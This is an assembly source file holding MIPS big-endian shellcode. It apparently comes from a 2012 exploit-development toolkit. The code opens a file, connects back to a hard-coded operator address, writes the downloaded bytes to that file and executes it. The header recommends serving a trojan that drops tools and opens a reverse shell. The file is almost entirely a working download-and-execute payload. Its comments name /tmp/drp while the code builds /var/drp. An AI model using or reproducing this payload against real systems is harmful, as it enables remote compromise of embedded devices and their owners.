/* 
 * (c) 2012 Zachary Cutlip <zcutlip@tacnetsol.com>,
 *          Tactical Network Solutions, LLC
 * 
 * This MIPS big-endian shellcode will connect back to the operator, read whatever
 * is served up, write that data to /tmp/drp, and attempt to execute that file.
 * 
 * One recommended usage is to serve up a dual-purpose trojan (see accomapanying
 * stage 2) that first drops a second file (e.g, tftp client), and then establishes
 * a connect-back shell to the operator.
 * 
 * This is ideal for situations where you can get execution on the system but have
 * no way of transferring files.  
 */

.set noat
/* open file */
lui	$t7,0x2f76 /* /v */
ori	$t7,0x6172 /* ar */
sw	$t7,-12($sp)
lui	$t6,0x2f64 /* /d */
ori	$t6,0x7270 /* rp */
sw	$t6,-8($sp)
sw	$zero,-4($sp)
addiu	$a0,$sp,-12
li	$a1,0x111 /* O_CREAT|O_WRONLY */
li	$a2,0x1ff /* 0777 */
li	$v0,4005	/* sys_open */
syscall	0x40404
sw	$v0,-44($sp)

/* connect */
li	$t7,-3
nor     $a1,$t7,$zero
sw      $a1,-32($sp) /* This puts AF_INET (2) into the sockaddr struct we'll need later  */
lw      $a0,-32($sp) /* this gets 2 into $a0 without a 0x20 in the shellcode */
slti    $a2,$zero,-1
li      $v0,4183 /*( sys_socket ) */
syscall 0x40404
sw      $v0,-1($sp)
lw      $a0,-1($sp)
/* li      $t7,-3 /*( sa_family = AF_INET ) */
/* nor     $t7,$t7,$zero */
/* sw	$t7,-32($sp) */
lui     $t6,0x7a69 /*( sin_port = 0x7a69 )*/
ori     $t6,$t6,0x7a69
sw      $t6,-28($sp)
lui     $t5,0x0a0a     /*( sin_addr = 0xa0a0 ... */
ori     $t5,$t5,0x0a0a  /*        ...0a0a ) 10.10.10.10*/
sw      $t5,-26($sp)
addiu    $a1,$sp,-30
li      $t4,-17 /*( addrlen = 16 )    */
nor     $a2,$t4,$zero
li      $v0,4170 /*( sys_connect ) */
syscall 0x40404

/* prep first "write" to be 0 in size */
slti    $a2,$zero,-1
write_file:
  lw      $a0,-44($sp)
  addiu   $a1,$sp,-48
  /* On 1st pass $a2 has 0, so this write is inert */
  /* on 2nd+ pass $a2 should have 1 from the 1 byte read */
  li      $v0,4004 /*sys_write*/
  syscall 0x40404

/* read from socket */
lw      $a0,-1($sp)
addiu   $a1,$sp,-48
slti    $a2,$zero,0x0fff
li      $v0,4003 /*sys_read */
syscall 0x40404
bgtz    $v0,write_file

/* close socket */
li      $v0,4006
syscall 0x40404
/* close dropped file */
lw      $a0,-44($sp)
li      $v0,4006
syscall 0x40404

/* exec /tmp/drp */
addiu $a0,$sp,-12 /* a0 contains char * "/tmp/drp" */
sw    $a0,-48($sp) /* copy char * to stack for first elem in char ** */
sw    $v0,-44($sp) /* hopefully v0 contains 0 from close()?  Copy NULL to stack for 2nd
                   /* elem in char ** */
/*addiu $a1,$sp,-48 */ /* Reusing stack addr from read/write loop, already in a1 */
slti    $a2,$zero,-1
li  $v0,4011  /* sys_execve */
syscall 0x40404

